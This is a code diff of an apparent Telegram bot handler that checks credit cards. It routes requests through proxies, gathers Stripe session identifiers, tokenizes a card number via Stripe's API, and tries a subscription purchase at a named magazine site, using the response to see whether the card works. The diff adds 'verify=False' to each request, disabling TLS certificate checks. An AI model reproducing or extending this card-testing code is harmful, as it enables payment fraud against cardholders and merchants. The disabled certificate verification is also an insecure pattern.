@@ -171,9 +171,9 @@ async def ch(message: types.Message):
             "content-type": "application/x-www-form-urlencoded"
         }
 
-        b = session.get('https://ip.seeip.org/', proxies=proxies).text
+        b = session.get('https://ip.seeip.org/', proxies=proxies, verify=False).text
 
-        s = session.post('https://m.stripe.com/6', headers=headers, proxies=proxies)
+        s = session.post('https://m.stripe.com/6', headers=headers, proxies=proxies, verify=False)
         r = s.json()
         Guid = r['guid']
         Muid = r['muid']
@@ -202,7 +202,7 @@ async def ch(message: types.Message):
         }
 
         rx = session.post('https://api.stripe.com/v1/tokens',
-                          data=load, headers=header, proxies=proxies)
+                          data=load, headers=header, proxies=proxies, verify=False)
         token = rx.json()['id']
         LastF = f'************{ccn[-4:]}'
 
@@ -233,7 +233,7 @@ async def ch(message: types.Message):
         }
 
         ri = session.post('https://preludemag.com/subscribe/', data=payload,
-                          headers=head, proxies=proxies)
+                          headers=head, proxies=proxies, verify=False)
         toc = time.perf_counter()
 
         if 'success' in ri.text:
